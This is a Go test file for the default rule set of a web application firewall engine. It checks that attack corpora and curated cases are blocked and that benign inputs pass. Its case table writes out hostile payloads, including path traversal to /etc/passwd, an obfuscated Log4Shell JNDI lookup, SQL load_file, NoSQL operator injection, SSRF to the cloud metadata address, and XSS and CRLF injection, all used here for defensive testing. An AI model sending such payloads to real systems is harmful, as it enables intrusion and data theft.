package defaults

import (
	"bufio"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Xwudao/sentra/internal/engine"
)

func newEngine(t *testing.T) *engine.Engine {
	t.Helper()
	e := engine.New(engine.DefaultConfig(), engine.Options{})
	t.Cleanup(e.Close)
	if _, err := e.ReloadRules(Rules()); err != nil {
		t.Fatalf("compile default rules: %v", err)
	}
	return e
}

func evaluate(t *testing.T, e *engine.Engine, target string) (blocked bool, ruleIDs []string) {
	t.Helper()
	target = strings.ReplaceAll(target, " ", "%20")
	r := httptest.NewRequest("GET", "http://example.com"+target, nil)
	d := e.Evaluate(e.NewContext(r))
	for _, m := range d.Matches {
		ruleIDs = append(ruleIDs, m.RuleID)
	}
	return d.Blocked, ruleIDs
}

func TestAttackCorpusBlocked(t *testing.T) {
	e := newEngine(t)
	files := mustGlob(t, "../../testdata/attacks/*.txt")
	if len(files) == 0 {
		t.Fatal("no attack corpus files found")
	}
	for _, f := range files {
		for _, line := range readLines(t, f) {
			blocked, ids := evaluate(t, e, line)
			if !blocked {
				t.Errorf("%s: expected block for %q (matches=%v)", filepath.Base(f), line, ids)
			}
		}
	}
}

func TestBenignCorpusAllowed(t *testing.T) {
	e := newEngine(t)
	files := mustGlob(t, "../../testdata/benign/*.txt")
	for _, f := range files {
		for _, line := range readLines(t, f) {
			blocked, ids := evaluate(t, e, line)
			if blocked {
				t.Errorf("%s: false positive for %q (matches=%v)", filepath.Base(f), line, ids)
			}
		}
	}
}

// Exercise the rules added from txsp2 through the request engine, including
// their target selection and transforms (not just regexp compilation).
func TestCuratedRules(t *testing.T) {
	e := newEngine(t)
	cases := []struct {
		name, method, path, body, header, value, ruleID string
		block                                           bool
	}{
		{"body traversal", "POST", "/", "../../etc/passwd", "", "", "body-sensitive-path", true},
		{"obfuscated jndi", "GET", "/?q=%24%7B%24%7Blower%3Aj%7Dndi%3Aldap%3A%2F%2Fevil%7D", "", "", "", "log4shell-jndi", true},
		{"sensitive internals", "GET", "/WEB-INF/web.xml", "", "", "", "sensitive-files", true},
		{"sql file", "GET", "/?q=load_file%28%27%2Fetc%2Fpasswd%27%29", "", "", "", "sqli-primitives", true},
		{"nosql json", "POST", "/", `{"$ne":null}`, "", "", "nosql-operator-injection", true},
		{"nosql form", "GET", "/?user%5B%24ne%5D=x", "", "", "", "nosql-operator-injection", true},
		{"ssrf query", "GET", "/?url=http%3A%2F%2F169.254.169.254%2Flatest", "", "", "", "ssrf-private-url", true},
		{"ssrf body", "POST", "/", `{"url":"http://localhost/admin"}`, "", "", "ssrf-private-url", true},
		{"serialized", "POST", "/", "rO0ABpayload", "", "", "java-serialized-object", true},
		{"double encoded", "GET", "/?q=%253C", "", "", "", "double-encoded-metachar", true},
		{"srcdoc", "POST", "/", `<iframe srcdoc="hello">`, "", "", "xss-iframe-srcdoc", true},
		{"crlf header", "GET", "/", "", "X-Test", "a%0d%0ab", "crlf-header", false},
		{"seo crawler", "GET", "/", "", "User-Agent", "AhrefsBot/7", "commercial-crawlers", true},
		{"ai crawler", "GET", "/", "", "User-Agent", "GPTBot/1", "ai-training-crawlers", true},
		{"benign prose", "POST", "/", "select a book from the list; please confirm (by clicking)", "", "", "", false},
		{"benign referer", "GET", "/", "", "Referer", "http://nas.local/app", "", false},
		{"benign nested URL", "GET", "/?next=" + url.QueryEscape("https://example.com/a%252Fb"), "", "", "", "", false},
		{"benign netmask", "GET", "/?mask=255.255.255.0", "", "", "", "", false},
		{"benign encoded newline", "GET", "/", "", "X-Test", "a%0ab", "", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := httptest.NewRequest(tc.method, "http://example.com"+tc.path, strings.NewReader(tc.body))
			if tc.header != "" {
				r.Header.Set(tc.header, tc.value)
			}
			d := e.EvaluateDebug(e.NewContext(r))
			if d.Blocked != tc.block {
				t.Errorf("blocked=%v, want %v (matches=%v)", d.Blocked, tc.block, d.Matches)
			}
			if tc.ruleID != "" {
				found := false
				for _, m := range d.Matches {
					found = found || m.RuleID == tc.ruleID
				}
				if !found {
					t.Errorf("missing match %s (matches=%v)", tc.ruleID, d.Matches)
				}
			}
		})
	}
}

func TestDefaultRulesValid(t *testing.T) {
	seen := map[string]bool{}
	for _, r := range Rules() {
		if seen[r.ID] {
			t.Errorf("duplicate default rule id %q", r.ID)
		}
		seen[r.ID] = true
		if r.Description == "" {
			t.Errorf("rule %s missing description", r.ID)
		}
		if len(r.Tags) == 0 {
			t.Errorf("rule %s missing tags", r.ID)
		}
	}
	if _, err := engine.New(engine.DefaultConfig(), engine.Options{}).ReloadRules(Rules()); err != nil {
		t.Fatal(err)
	}
}

func mustGlob(t *testing.T, pattern string) []string {
	t.Helper()
	files, err := filepath.Glob(pattern)
	if err != nil {
		t.Fatal(err)
	}
	return files
}

func readLines(t *testing.T, path string) []string {
	t.Helper()
	f, err := os.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	var out []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		out = append(out, line)
	}
	if err := sc.Err(); err != nil {
		t.Fatal(err)
	}
	return out
}
